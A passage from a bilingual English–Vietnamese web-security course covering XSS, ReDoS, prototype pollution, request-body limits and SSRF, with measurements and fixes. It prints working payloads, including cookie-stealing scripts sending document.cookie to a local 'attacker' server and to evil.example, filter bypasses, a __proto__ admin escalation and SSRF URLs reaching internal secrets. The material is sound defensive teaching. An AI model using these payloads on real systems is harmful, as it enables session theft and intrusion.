  lọc tự chế: &lt;img src=x onerror="fetch('https://evil.example/?c='+document.cookie)"&gt;   ← NGUYÊN VẸN
  sanitize  : &lt;img src="x" /&gt;
  DOMPurify : &lt;img src="x"&gt;

■ script lồng nhau
  vào       : &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;
  lọc tự chế: &lt;script&gt;                       ← BỘ LỌC TỰ TẠO RA THẺ SCRIPT
  sanitize  : ipt&amp;gt;alert(1)ipt&amp;gt;
  DOMPurify : ipt&amp;gt;alert(1)ipt&amp;gt;

■ svg onload
  lọc tự chế: &lt;svg/onload=alert(1)&gt;          ← NGUYÊN VẸN
  sanitize  : (rỗng)          DOMPurify : &lt;svg&gt;&lt;/svg&gt;

■ a href javascript:
  lọc tự chế: &lt;a href="javascript:alert(1)"&gt;Bấm vào đây&lt;/a&gt;   ← NGUYÊN VẸN
  sanitize  : &lt;a&gt;Bấm vào đây&lt;/a&gt;             DOMPurify : &lt;a&gt;Bấm vào đây&lt;/a&gt;

■ mXSS noscript
  vào       : &lt;noscript&gt;&lt;p title="&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;
  lọc tự chế: (nguyên vẹn)   sanitize : &lt;p&gt;&lt;/p&gt;   DOMPurify : &lt;p&gt;&lt;/p&gt;

■ nội dung hợp lệ
  sanitize  : &lt;p&gt;Ghi chú &lt;b&gt;quan trọng&lt;/b&gt;: xem &lt;a href="https://cuongthai.com"&gt;tại đây&lt;/a&gt;…</div>
<div class="callout danger"><p>Look at the second block one more time. The input contained no valid <code>&lt;script&gt;</code> tag; the home-made filter removed the inner <code>&lt;script&gt;</code> and, in doing so, <strong>joined the two halves into a working one</strong>. A single-pass replace on nested input produces exactly the thing it was written to remove. This is why "I wrote a filter" is a red flag and not a reassurance.</p></div>
<p>Note also the last row: the legitimate note survives both real sanitizers untouched. Sanitizing is not "stripping HTML"; it is keeping the markup that carries meaning and dropping the markup that carries behaviour.</p>

<h3>Escape or sanitize? Answer one question</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Is the field plain text?</span><span class="v">Display name, title, comment, city. Then <strong>escape</strong> — or better, use a framework that escapes by default. React's <code>{value}</code> escapes; so does any template engine's <code>{{ }}</code>. You literally cannot get XSS this way.</span></div>
  <div class="kv"><span class="k">Must the field carry formatting?</span><span class="v">Rich-text editor output, markdown rendered to HTML, imported articles. Escaping would destroy it, so you must <strong>sanitize</strong>: parse it into a DOM, walk it, delete everything not on the allow-list, serialise it back.</span></div>
</div>
<p>There is no third option. "Strip the dangerous bits with a regex" is not a category — HTML is not a regular language, and every filter ever written has lost this race.</p>

<h3>Measurement 3 — what sanitizing costs</h3>
<p>The same 12.1KB document, 200 iterations each:</p>
<div class="out">escape        0.211ms cho 12.1KB  →  4747 lần/giây
sanitize-html 0.903ms cho 12.1KB  →  1107 lần/giây
DOMPurify    12.245ms cho 12.1KB  →    82 lần/giây</div>
<p>DOMPurify is <strong>58× more expensive than escaping</strong> and 13.5× more expensive than sanitize-html here, because on the server it has to build a full jsdom document. That number is not an argument against DOMPurify — it is an argument about <em>where</em> to run it. 12ms of CPU per render, in an event loop (chapter 2), is real: 82 renders per second saturates one core. In the browser, where the DOM already exists, the same call is a fraction of that and costs your server nothing.</p>

<h3>Sanitize on write, or on read?</h3>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">Trên đường ghi (on write)</span><span class="lz-lnote">rẻ — làm một lần cho mỗi bài viết; nhưng dữ liệu gốc mất vĩnh viễn, và luật hôm nay là luật bạn phải sống cùng mãi mãi</span></div>
  <div class="lz-layer"><span class="lz-lname">Trên đường đọc (on read)</span><span class="lz-lnote">đắt hơn — mỗi lần hiển thị; đổi lại luật sửa được, bản vá của thư viện tự áp dụng cho dữ liệu CŨ</span></div>
</div>
<p>The trade-off is real, and the reason to prefer the render layer is that bypasses are discovered <em>after</em> your data is stored. A mutation-XSS bypass patched in DOMPurify next month protects you retroactively only if you sanitize when rendering. Sanitizing on write and trusting the column forever means the row that was "clean" under an old version stays in your database, trusted, forever.</p>

<div class="note-ct">
<p><strong>How cuongthai.com does it.</strong> The stored-XSS defence lives at the render layer, in <code>frontend/src/lib/sanitizeHtml.ts</code>: a single exported <code>sanitizeHtml(dirty)</code> wrapping <code>isomorphic-dompurify</code>, called on every path that reaches <code>dangerouslySetInnerHTML</code> — Exp Hub notes and explanations, tech-trends article bodies, the rich-text editor preview. <code>isomorphic-dompurify</code> is chosen deliberately so the same import works in a client component and during server rendering (it falls back to a jsdom window on the server, native DOMPurify in the browser). YouTube embeds are <em>not</em> allowed through the HTML; Exp Hub carries a separate structured <code>youtubeUrl</code> field and builds its own iframe — which is the general pattern: when you need one dangerous element, take it out of the free-text channel and give it a typed field of its own.</p>
</div>

<div class="pitfall">
<p><strong>Four ways this comes back after you "fixed" it.</strong> (1) <code>element.innerHTML = data</code> anywhere in client code re-opens the hole with no server involvement. (2) Markdown renderers pass raw HTML through by default — markdown is not a sanitizer. (3) Embedding data in a page as <code>&lt;script&gt;window.__DATA__ = {"bio":"…"}&lt;/script&gt;</code> breaks out the moment the value contains the literal characters <code>&lt;/script&gt;</code>, no matter how valid the JSON is. (4) Sanitizing the body but not the <em>attributes</em> you build from user data — an <code>href</code> assembled by string concatenation accepts <code>javascript:</code> just fine.</p>
</div>

<div class="callout ok"><p>CSP earns its place here. With <code>script-src 'self'</code> and no <code>'unsafe-inline'</code>, the payload in Measurement 1 is parsed into the DOM and then refused execution by the browser — a second, independent layer that catches the XSS you missed. That is exactly why it is worth paying the configuration cost from lesson 9.1 even though your sanitizer is supposed to be enough.</p></div>

<a class="link-card codelab" href="/code-lab/authentication${REF}#module-957" target="_blank" rel="noopener">
  <span class="lc-ico">⌨️</span>
  <span class="lc-body"><span class="lc-title">Module 957 — CSRF, XSS &amp; Session Security</span><span class="lc-sub">10 bài tập: payload, sanitize, CSP và cookie an toàn.</span></span>
</a>
<a class="link-card codelab" href="/code-lab/javascript${REF}#module-561" target="_blank" rel="noopener">
  <span class="lc-ico">⌨️</span>
  <span class="lc-body"><span class="lc-title">Module 561 — Security, Error Handling, and Debugging Mastery</span><span class="lc-sub">10 bài tập: xử lý dữ liệu không tin cậy ngay trong JavaScript.</span></span>
</a>
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 9 · Bài 9.2</span>
<h2>XSS: từ ghi chú của người lạ tới phiên đăng nhập của bạn</h2>
<p class="lead">Cross-site scripting là lỗ hổng bị coi nhẹ nhất, vì cái tên nghe như chuyện của trình duyệt và bản demo ai cũng từng xem chỉ là <code>alert(1)</code>. Nó không phải chuyện của trình duyệt — nó là chuyện backend của bạn lưu một đoạn văn bản còn frontend của bạn đem chạy nó. Và nó không dừng ở một hộp thoại: script bị chèn chạy <em>bên trong phiên đăng nhập của người dùng</em>, với cookie của họ, quyền của họ, token CSRF của họ. Người dùng đó làm được gì thì script làm được nấy.</p>

<h3>Ba dạng, một nguyên nhân gốc</h3>
<div class="lz-flow">
  <div class="lz-step"><span class="lz-t">Lưu trữ (stored)</span><span class="lz-d">payload nằm trong cơ sở dữ liệu của bạn — một ghi chú, một bình luận, một tên hiển thị — và nổ với MỌI khách mở trang</span></div>
  <div class="lz-step"><span class="lz-t">Phản chiếu (reflected)</span><span class="lz-d">payload đi trong URL rồi được in ngược vào trang: <code>/search?q=…</code>. Cần nạn nhân bấm vào link</span></div>
  <div class="lz-step"><span class="lz-t">Trên DOM</span><span class="lz-d">máy chủ vô can; chính JavaScript phía client ghi dữ liệu không tin cậy vào <code>innerHTML</code></span></div>
</div>
<p>Một nguyên nhân gốc cho cả ba: <strong>dữ liệu vượt qua một ranh giới để bước vào ngữ cảnh mà nó bị ĐỌC NHƯ CODE</strong>. Dạng lưu trữ là tệ nhất vì nó không cần link, không cần lừa đảo, không cần thao tác gì — nạn nhân chỉ vào đúng cái trang họ vẫn vào mỗi ngày.</p>

<h3>Phép đo 1 — một lỗ stored XSS, từ đầu tới cuối, với trình duyệt thật</h3>
<p>Không có gì được mô phỏng ở đây. Có ba tiến trình: máy chủ của kẻ tấn công ở cổng 4302 ghi lại mọi thứ bay tới, bảng tin Notes ở 4301 hiển thị các ghi chú đã lưu, và nạn nhân — một bản cài đặt DOM thật (jsdom) phân tích HTML và <em>thực thi các script bên trong</em>. Kẻ tấn công đăng một ghi chú:</p>
<pre><code><span class="tok-kw">const</span> PAYLOAD = <span class="tok-str">&#96;&lt;script&gt;var x=new XMLHttpRequest();
  x.open('GET','http://127.0.0.1:4302/steal?c='+encodeURIComponent(document.cookie));
  x.send()&lt;/script&gt;&#96;</span>;
<span class="tok-kw">await</span> fetch(<span class="tok-str">'http://127.0.0.1:4301/notes'</span>, { method: <span class="tok-str">'POST'</span>,
  headers: { <span class="tok-str">'content-type'</span>: <span class="tok-str">'application/json'</span> }, body: JSON.stringify({ body: PAYLOAD }) });</code></pre>
<p>Rồi nạn nhân — đang đăng nhập, có cookie phiên — mở bảng tin. Ba lần chạy, mỗi lần đổi đúng một thứ:</p>
<div class="out">=== Stored XSS: ghi chú của kẻ tấn công nằm trong bảng tin của mọi người ===
1) hiển thị thô, cookie KHÔNG httpOnly
   → máy chủ kẻ tấn công nhận được: ["session=eyJhbGciOi.NGUOI-DUNG-AN"]
2) hiển thị thô, cookie CÓ httpOnly
   → máy chủ kẻ tấn công nhận được: [""]
3) sanitize-html + httpOnly
   → máy chủ kẻ tấn công nhận được: (không có gì)</div>
<p>Lần 1 là chiếm tài khoản trọn vẹn: máy chủ của kẻ tấn công giờ giữ một token phiên hợp lệ của một người dùng chẳng làm gì ngoài việc mở một trang. Lần 2 cho thấy chính xác <code>httpOnly</code> mua được cái gì — script vẫn chạy, chỉ là nó thấy chuỗi rỗng trong <code>document.cookie</code>. Lần 3 mới là bản sửa thật: payload không hề trở thành một phần tử <code>&lt;script&gt;</code>, nên không có gì được gửi đi.</p>

<h3>httpOnly không phải bản sửa, và đây là bằng chứng</h3>
<p>Vẫn nạn nhân đó, vẫn cookie httpOnly đó, chỉ đổi payload — payload này không đọc cookie, nó chỉ đơn giản <em>dùng</em> cookie:</p>
<pre><code><span class="tok-str">&#96;&lt;script&gt;var x=new XMLHttpRequest();
  x.open('POST','/notes/delete-all'); x.send()&lt;/script&gt;&#96;</span></code></pre>
<div class="out">4) cookie httpOnly, payload KHÔNG đọc cookie mà tự gọi API:
   /notes/delete-all được gọi 1 lần  ← XSS = chạy code TRONG phiên của nạn nhân</div>
<p>Trình duyệt tự gắn cookie phiên vào, vì request đi tới đúng cái origin mà trang được nạp từ đó. Dữ liệu bay sạch. <code>httpOnly</code> làm hẹp bán kính vụ nổ của một lỗ XSS; nó không chặn được vụ nổ. Bản sửa thật nằm ở phía trên: payload không bao giờ được phép chạm tới DOM dưới dạng thẻ.</p>

<h3>Phép đo 2 — chín payload, năm cách xử lý</h3>
<p>Escape, một bộ lọc regex tự chế (<code>replace(/&lt;script.*?&gt;.*?&lt;\\/script&gt;/gi, '')</code>), <code>sanitize-html</code> với danh sách trắng tường minh, và <code>DOMPurify</code> để mặc định. Đã rút gọn còn những dòng đáng nhìn:</p>
<div class="out">■ img onerror (ăn cookie)
  vào       : &lt;img src=x onerror="fetch('https://evil.example/?c='+document.cookie)"&gt;
  escape    : &amp;lt;img src=x onerror=&amp;quot;fetch(…
  lọc tự chế: &lt;img src=x onerror="fetch('https://evil.example/?c='+document.cookie)"&gt;   ← NGUYÊN VẸN
  sanitize  : &lt;img src="x" /&gt;
  DOMPurify : &lt;img src="x"&gt;

■ script lồng nhau
  vào       : &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;
  lọc tự chế: &lt;script&gt;                       ← BỘ LỌC TỰ TẠO RA THẺ SCRIPT
  sanitize  : ipt&amp;gt;alert(1)ipt&amp;gt;
  DOMPurify : ipt&amp;gt;alert(1)ipt&amp;gt;

■ svg onload
  lọc tự chế: &lt;svg/onload=alert(1)&gt;          ← NGUYÊN VẸN
  sanitize  : (rỗng)          DOMPurify : &lt;svg&gt;&lt;/svg&gt;

■ a href javascript:
  lọc tự chế: &lt;a href="javascript:alert(1)"&gt;Bấm vào đây&lt;/a&gt;   ← NGUYÊN VẸN
  sanitize  : &lt;a&gt;Bấm vào đây&lt;/a&gt;             DOMPurify : &lt;a&gt;Bấm vào đây&lt;/a&gt;

■ mXSS noscript
  vào       : &lt;noscript&gt;&lt;p title="&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;
  lọc tự chế: (nguyên vẹn)   sanitize : &lt;p&gt;&lt;/p&gt;   DOMPurify : &lt;p&gt;&lt;/p&gt;

■ nội dung hợp lệ
  sanitize  : &lt;p&gt;Ghi chú &lt;b&gt;quan trọng&lt;/b&gt;: xem &lt;a href="https://cuongthai.com"&gt;tại đây&lt;/a&gt;…</div>
<div class="callout danger"><p>Nhìn lại khối thứ hai một lần nữa. Đầu vào KHÔNG chứa thẻ <code>&lt;script&gt;</code> hợp lệ nào; bộ lọc tự chế xoá thẻ <code>&lt;script&gt;</code> bên trong và khi làm vậy nó <strong>ghép hai nửa thành một thẻ chạy được</strong>. Một lần replace duy nhất trên đầu vào lồng nhau đẻ ra đúng cái thứ nó được viết ra để xoá. Đó là lý do câu "em có viết bộ lọc rồi" là một dấu hiệu báo động, không phải một lời trấn an.</p></div>
<p>Cũng để ý dòng cuối: ghi chú hợp lệ đi qua cả hai bộ sanitize thật mà không suy suyển. Sanitize không phải "vứt hết HTML"; nó là giữ lại phần đánh dấu mang Ý NGHĨA và bỏ đi phần đánh dấu mang HÀNH VI.</p>

<h3>Escape hay sanitize? Trả lời đúng một câu hỏi</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Trường này có phải văn bản thuần không?</span><span class="v">Tên hiển thị, tiêu đề, bình luận, tên thành phố. Vậy thì <strong>escape</strong> — hoặc tốt hơn, dùng framework escape sẵn theo mặc định. <code>{value}</code> của React có escape; <code>{{ }}</code> của mọi template engine cũng vậy. Đi đường này bạn gần như không thể dính XSS.</span></div>
  <div class="kv"><span class="k">Trường này BẮT BUỘC phải mang định dạng?</span><span class="v">Kết quả của trình soạn thảo rich-text, markdown đã render ra HTML, bài viết nhập từ nguồn ngoài. Escape sẽ phá hỏng nó, nên bạn phải <strong>sanitize</strong>: phân tích thành DOM, duyệt cây, xoá mọi thứ không nằm trong danh sách trắng, rồi ghi ngược ra chuỗi.</span></div>
</div>
<p>Không có lựa chọn thứ ba. "Dùng regex bóc phần nguy hiểm ra" không phải một hạng mục — HTML không phải ngôn ngữ chính quy, và mọi bộ lọc từng được viết đều đã thua cuộc đua này.</p>

<h3>Phép đo 3 — sanitize tốn bao nhiêu</h3>
<p>Cùng một tài liệu 12,1KB, mỗi cách chạy 200 lần:</p>
<div class="out">escape        0.211ms cho 12.1KB  →  4747 lần/giây
sanitize-html 0.903ms cho 12.1KB  →  1107 lần/giây
DOMPurify    12.245ms cho 12.1KB  →    82 lần/giây</div>
<p>DOMPurify đắt hơn escape <strong>58 lần</strong> và đắt hơn sanitize-html 13,5 lần ở đây, vì trên máy chủ nó phải dựng cả một tài liệu jsdom. Con số đó không phải lý lẽ chống lại DOMPurify — nó là lý lẽ về việc chạy nó Ở ĐÂU. 12ms CPU cho mỗi lần render, trong một event loop (chương 2), là con số thật: 82 lần render mỗi giây đã lấp đầy một nhân. Còn trong trình duyệt, nơi DOM đã sẵn có, cùng lời gọi đó rẻ hơn nhiều lần và không tốn gì của máy chủ bạn.</p>

<h3>Sanitize lúc ghi, hay lúc đọc?</h3>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">Trên đường ghi (on write)</span><span class="lz-lnote">rẻ — làm một lần cho mỗi bài viết; nhưng dữ liệu gốc mất vĩnh viễn, và luật của hôm nay là luật bạn phải sống cùng mãi mãi</span></div>
  <div class="lz-layer"><span class="lz-lname">Trên đường đọc (on read)</span><span class="lz-lnote">đắt hơn — mỗi lần hiển thị; đổi lại luật sửa được, bản vá của thư viện tự áp dụng cho cả dữ liệu CŨ</span></div>
</div>
<p>Đánh đổi là có thật, và lý do nên nghiêng về tầng render là: các đòn qua mặt sanitizer luôn được phát hiện SAU khi dữ liệu của bạn đã nằm trong kho. Một đòn mutation-XSS được vá trong DOMPurify tháng sau chỉ bảo vệ bạn cho dữ liệu cũ nếu bạn sanitize lúc hiển thị. Sanitize lúc ghi rồi tin tưởng cái cột đó mãi mãi nghĩa là dòng dữ liệu từng "sạch" theo phiên bản cũ sẽ nằm im trong cơ sở dữ liệu, được tin tưởng, vĩnh viễn.</p>

<div class="note-ct">
<p><strong>cuongthai.com làm thế nào.</strong> Lớp chống stored XSS nằm ở tầng render, trong <code>frontend/src/lib/sanitizeHtml.ts</code>: đúng một hàm <code>sanitizeHtml(dirty)</code> bọc <code>isomorphic-dompurify</code>, được gọi trên mọi đường dẫn dẫn tới <code>dangerouslySetInnerHTML</code> — ghi chú và phần giải thích của Exp Hub, thân bài viết tech-trends, phần xem trước của trình soạn thảo rich-text. <code>isomorphic-dompurify</code> được chọn có chủ đích để cùng một câu import chạy được cả trong client component lẫn khi render phía máy chủ (trên máy chủ nó lùi về một window jsdom, trong trình duyệt thì dùng DOMPurify gốc). Nhúng YouTube <em>không</em> được cho phép đi qua HTML; Exp Hub có một trường riêng có cấu trúc là <code>youtubeUrl</code> và tự dựng iframe của nó — đó là khuôn mẫu chung: khi bạn cần đúng một phần tử nguy hiểm, hãy lôi nó ra khỏi kênh văn bản tự do và cấp cho nó một trường có kiểu riêng.</p>
</div>

<div class="pitfall">
<p><strong>Bốn con đường khiến nó quay lại sau khi bạn "đã sửa".</strong> (1) <code>element.innerHTML = data</code> ở bất kỳ đâu trong code phía client mở lại lỗ hổng mà máy chủ không hề dự phần. (2) Bộ render markdown mặc định cho HTML thô đi thẳng qua — markdown không phải sanitizer. (3) Nhúng dữ liệu vào trang kiểu <code>&lt;script&gt;window.__DATA__ = {"bio":"…"}&lt;/script&gt;</code> sẽ bị thoát ra ngay khi giá trị chứa đúng chuỗi ký tự <code>&lt;/script&gt;</code>, dù JSON có hợp lệ đến đâu. (4) Sanitize phần thân nhưng quên các <em>thuộc tính</em> bạn tự ghép từ dữ liệu người dùng — một <code>href</code> nối bằng chuỗi nhận <code>javascript:</code> ngon lành.</p>
</div>

<div class="callout ok"><p>CSP xứng đáng có mặt ở đây. Với <code>script-src 'self'</code> và không có <code>'unsafe-inline'</code>, payload ở Phép đo 1 vẫn được phân tích vào DOM nhưng bị trình duyệt từ chối thực thi — một lớp thứ hai, độc lập, đỡ lấy đúng cái lỗ XSS mà bạn bỏ sót. Đó chính xác là lý do đáng bỏ công cấu hình nó ở bài 9.1 dù bộ sanitize của bạn lẽ ra đã đủ.</p></div>

<a class="link-card codelab" href="/code-lab/authentication${REF}#module-957" target="_blank" rel="noopener">
  <span class="lc-ico">⌨️</span>
  <span class="lc-body"><span class="lc-title">Module 957 — CSRF, XSS &amp; Session Security</span><span class="lc-sub">10 bài tập: payload, sanitize, CSP và cookie an toàn.</span></span>
</a>
<a class="link-card codelab" href="/code-lab/javascript${REF}#module-561" target="_blank" rel="noopener">
  <span class="lc-ico">⌨️</span>
  <span class="lc-body"><span class="lc-title">Module 561 — Security, Error Handling, and Debugging Mastery</span><span class="lc-sub">10 bài tập: xử lý dữ liệu không tin cậy ngay trong JavaScript.</span></span>
</a>
</div>
`,
    },
    /* ─────────────────────────── 9.3 ─────────────────────────── */
    {
      title: '9.3 — Input is the enemy: ReDoS, prototype pollution, body limits, SSRF|||9.3 — Đầu vào là kẻ thù: ReDoS, ô nhiễm nguyên mẫu, giới hạn thân request, SSRF',
      slug: 'nodejs-9-3-dau-vao-doc-hai',
      type: 'VIDEO',
      description: 'Bốn đòn tấn công không cần mật khẩu, không cần XSS: một chuỗi 31 ký tự đóng băng máy chủ, một khoá JSON cấp quyền admin, một request 11MB, và một URL khiến máy chủ tự đi đọc bí mật của chính nó.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 9 · Lesson 9.3</span>
<h2>Input is the enemy: ReDoS, prototype pollution, body limits, SSRF</h2>
<p class="lead">Lesson 9.2 was about data leaving your system into a page. This one is about data arriving. Four attacks, none of which needs a password, a stolen token or an XSS. Each one is a normal-looking request that your validation would happily accept, and each one has a measurement attached showing exactly what it costs you.</p>

<h3>1. ReDoS — 31 characters that freeze the whole server</h3>
<p>A regular expression with a nested quantifier. It is not exotic; variants of it appear in validation code everywhere:</p>
<pre><code><span class="tok-kw">const</span> RE = /^(a+)+$/;
RE.test(<span class="tok-str">'a'</span>.repeat(n) + <span class="tok-str">'!'</span>);   <span class="tok-cmt">// input không khớp</span></code></pre>
<div class="out">20 ký tự →       8.0ms
22 ký tự →      32.4ms
24 ký tự →     135.7ms
26 ký tự →     537.5ms
28 ký tự →    1954.0ms
30 ký tự →    9478.8ms</div>
<p>Every two characters multiply the time by about four. Because the string ends in <code>!</code> the match must fail, and to prove failure the engine tries every way of splitting those <em>n</em> characters between the inner and outer <code>+</code> — an exponential number of ways. This is called catastrophic backtracking, and note what the input is: 31 characters. Not a gigabyte. Thirty-one bytes in a form field.</p>
<p>Now measure what it does to a server, using the same heartbeat technique as chapter 2:</p>
<div class="out">=== Nhịp tim 100ms trong lúc RE.test(30 ký tự) chạy ===
  regex 7652ms → nhịp tim trễ tối đa 7552ms</div>
<p>A regular expression is synchronous JavaScript. It blocks the event loop exactly like the <code>for</code> loop in lesson 2.4 — every other request, every timer, every socket, for 7.5 seconds. One attacker sending ten of these per second takes your API down with no traffic worth noticing on any graph.</p>
<div class="callout warn"><p>You may object that <code>/^(a+)+$/</code> is a toy. Here is one that looks like something you would actually write — "trim trailing whitespace":</p>
<div class="out">/^([\\s\\S]*?)(\\s+)+$/
  10 dấu cách →      0.2ms
  18 dấu cách →      4.2ms
  22 dấu cách →     64.1ms
  26 dấu cách →   1115.5ms
  28 dấu cách →   4355.7ms</div>
<p>Twenty-eight spaces. The pattern that makes it explode is <code>(\\s+)+</code> — a quantifier applied to a group that itself ends in a quantifier over the same character class.</p></div>
<div class="kv-grid">
  <div class="kv"><span class="k">How to spot it</span><span class="v">Look for a quantifier wrapping a group that already has one: <code>(a+)+</code>, <code>(a*)*</code>, <code>(\\s+)+</code>, <code>(.*,)*</code>. Also alternations where branches can match the same text: <code>(a|aa)+</code>.</span></div>
  <div class="kv"><span class="k">Cap the length first</span><span class="v">Validate <code>max(200)</code> with zod (lesson 6.3) <em>before</em> any regex touches the value. Exponential growth on a bounded input is a bounded cost.</span></div>
  <div class="kv"><span class="k">Prefer non-regex</span><span class="v"><code>String.prototype.trimEnd()</code>, <code>includes</code>, <code>split</code>, <code>URL</code>, <code>Number.isInteger</code> — all linear. Most "clever" regexes in a codebase replace three lines of boring, fast code.</span></div>
  <div class="kv"><span class="k">Do not write an email regex</span><span class="v">The famous RFC-compliant ones are ReDoS material. Use <code>z.string().email()</code> or simply send a confirmation mail — the only real validation of an address.</span></div>
</div>

<h3>2. Prototype pollution — one JSON key that makes everyone an admin</h3>
<p>Every codebase has a deep-merge helper. This is what happens when the object being merged came from <code>req.body</code>:</p>
<pre><code><span class="tok-kw">function</span> <span class="tok-fn">merge</span>(target, src) {
  <span class="tok-kw">for</span> (<span class="tok-kw">const</span> k <span class="tok-kw">of</span> Object.keys(src)) {
    <span class="tok-kw">if</span> (<span class="tok-kw">typeof</span> src[k] === <span class="tok-str">'object'</span> &amp;&amp; src[k] !== <span class="tok-kw">null</span>) { target[k] ??= {}; merge(target[k], src[k]); }
    <span class="tok-kw">else</span> target[k] = src[k];
  }
  <span class="tok-kw">return</span> target;
}
merge({ name: <span class="tok-str">'An'</span> }, JSON.parse(<span class="tok-str">'{"__proto__":{"isAdmin":true}}'</span>));</code></pre>
<div class="out">Object.keys(req.body) = ["__proto__"] ← "__proto__" là khoá THẬT sau JSON.parse
trước khi trộn: ({}).isAdmin = undefined
sau khi trộn  : ({}).isAdmin = true
kiểm tra quyền: user.isAdmin → CHO QUA (!!)   — user chưa từng được gán isAdmin
Object.create(null).isAdmin = undefined ← object không nguyên mẫu thì miễn nhiễm
new Map().get("isAdmin")    = undefined</div>
<p>Read the fourth line carefully. <code>user</code> is a completely unrelated object that nobody assigned <code>isAdmin</code> to. It inherits the property from <code>Object.prototype</code>, which the merge modified. From this moment <strong>every plain object in the process</strong>, for every user, until restart, answers <code>true</code> to that check. That is what makes prototype pollution different from an ordinary bug: it is not scoped to the request that caused it.</p>
<p>Three defences, in order of how much they buy you:</p>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">Validate with a schema</span><span class="lz-lnote">zod <code>.object()</code> drops unknown keys (lesson 6.3) — <code>__proto__</code> is not in your schema, so it never reaches the merge</span></div>
  <div class="lz-layer"><span class="lz-lname">Reject dangerous keys explicitly</span><span class="lz-lnote">skip <code>__proto__</code>, <code>constructor</code>, <code>prototype</code> in any recursive copy — measured below, it works</span></div>
  <div class="lz-layer"><span class="lz-lname">Use structures without a prototype</span><span class="lz-lnote"><code>Object.create(null)</code> and <code>Map</code> are immune; a <code>Map</code> for user-controlled key/value data is the structurally correct choice anyway</span></div>
</div>
<div class="out">Bản vá 1 — bỏ qua khoá nguy hiểm:
  sau safeMerge : ({}).isAdmin = undefined</div>
<p>And a piece of good news you should verify rather than assume — how Express parses the query string:</p>
<div class="out">=== req.query: "simple" (mặc định Express 5) vs "extended" (qs) ===
  simple    → {"tags":["a","b"],"user[__proto__][isAdmin]":"true","user[name]":"An"}   poisoned=null
  extended  → {"tags":["a","b"],"user":{"name":"An"}}                                  poisoned=null</div>
<p>Neither parser pollutes. <code>simple</code> keeps the bracket syntax as a literal key name; <code>qs</code> (the <code>extended</code> parser) builds the nested object but silently drops the <code>__proto__</code> branch. The hole is not in Express — it is in the helper you wrote afterwards that merges <code>req.query</code> or <code>req.body</code> into something else.</p>

<h3>3. Body limits — one request, +139MB of RSS</h3>
<p><code>express.json()</code> defaults to <strong>100kb</strong>, and refuses politely above it:</p>
<div class="out">90KB  → 200 {"len":92168}
200KB → 413 {"type":"entity.too.large","message":"request entity too large","limit":102400}</div>
<p>Everyone raises that limit the first time a real payload gets rejected. Here is the price of raising it to 20mb, measured on the server process itself:</p>
<div class="out">thân request: 11.3MB
RSS máy chủ lúc rảnh : 61 MB
RSS ngay sau 1 request: 200 MB (parse 82ms, 200000 phần tử)
RSS sau 1.5 giây      : 213 MB</div>
<p>One request, 11.3MB on the wire, <strong>+139MB of resident memory</strong> — roughly 12× the body size, because the raw buffer, the decoded string and the parsed object tree all exist at once and JavaScript objects are not compact. Ten of these arriving together is 1.4GB. On the 6GB VPS this project runs on, that is the OOM killer taking your container, and the request that triggered it looked completely valid.</p>
<div class="kv-grid">
  <div class="kv"><span class="k">Set the limit per route</span><span class="v">A global 10mb because one upload endpoint needs it hands every other endpoint the same weapon. Mount <code>express.json({ limit: '100kb' })</code> globally and a larger parser only where it is needed.</span></div>
  <div class="kv"><span class="k">Files do not go through JSON</span><span class="v">Uploads belong in <code>multipart/form-data</code>, streamed to storage (chapter 10), never base64 inside a JSON body — base64 also inflates by 33% before parsing.</span></div>
  <div class="kv"><span class="k">Bound the arrays too</span><span class="v">A 90KB body under the limit can still contain 5,000 items whose processing is <code>O(n²)</code>. Validate <code>.max()</code> on array lengths, not only on the byte count.</span></div>
</div>

<h3>4. SSRF — making your server read its own secrets</h3>
<p>The feature is completely ordinary: a link preview, an avatar import, a webhook test button. The user supplies a URL and the server fetches it.</p>
<pre><code>app.get(<span class="tok-str">'/preview'</span>, <span class="tok-kw">async</span> (req, res) =&gt; {
  <span class="tok-kw">const</span> r = <span class="tok-kw">await</span> fetch(req.query.url);      <span class="tok-cmt">// ← toàn bộ lỗ hổng nằm ở đây</span>
  res.type(<span class="tok-str">'text'</span>).send(<span class="tok-kw">await</span> r.text());
});</code></pre>
<p>An internal service that is not exposed to the internet at all is listening on 4404. The attacker never needs to reach it — your server can, and your server is the one making the request:</p>
<div class="out">/preview?url=http://127.0.0.1:4404/admin/config →
  200 {"DATABASE_URL":"postgres://prod:sieu-mat@db:5432/app","R2_SECRET":"wJalr…"}</div>
<p>That is the whole attack. In a container network the same trick reaches <code>http://postgres:5432</code>, <code>http://redis:6379</code>, the Docker socket, or — on a cloud VM — the metadata endpoint at <code>169.254.169.254</code> that hands out temporary IAM credentials. The firewall did nothing wrong: the request came from inside.</p>
<p>Now the fixed version, and the trap in it:</p>
<pre><code><span class="tok-kw">const</span> ALLOW = <span class="tok-kw">new</span> Set([<span class="tok-str">'media.cuongthai.com'</span>, <span class="tok-str">'i.giphy.com'</span>]);
<span class="tok-kw">const</span> u = <span class="tok-kw">new</span> URL(req.query.url);
<span class="tok-kw">if</span> (u.protocol !== <span class="tok-str">'https:'</span>) <span class="tok-kw">return</span> res.status(<span class="tok-num">400</span>).json({ error: <span class="tok-str">'chỉ chấp nhận https'</span> });
<span class="tok-kw">if</span> (!ALLOW.has(u.hostname)) <span class="tok-kw">return</span> res.status(<span class="tok-num">400</span>).json({ error: <span class="tok-str">'tên miền không nằm trong danh sách trắng'</span> });</code></pre>
<div class="out">/preview-safe (cùng URL nội bộ) → 400 {"error":"chỉ chấp nhận https"}
/preview-safe (ảnh hợp lệ)      → 200 {"ok":"sẽ đi lấy","host":"media.cuongthai.com"}
/preview?url=file:///etc/hostname → fetch failed (undici không hỗ trợ file:)</div>
<div class="callout danger"><p>And now the trap. The attacker gives you a URL that passes every check — a real https host they control — which answers with a <code>302</code>:</p>
<div class="out">/preview?url=http://127.0.0.1:4406/anh.png (URL "vô hại" rồi 302 về nội bộ) →
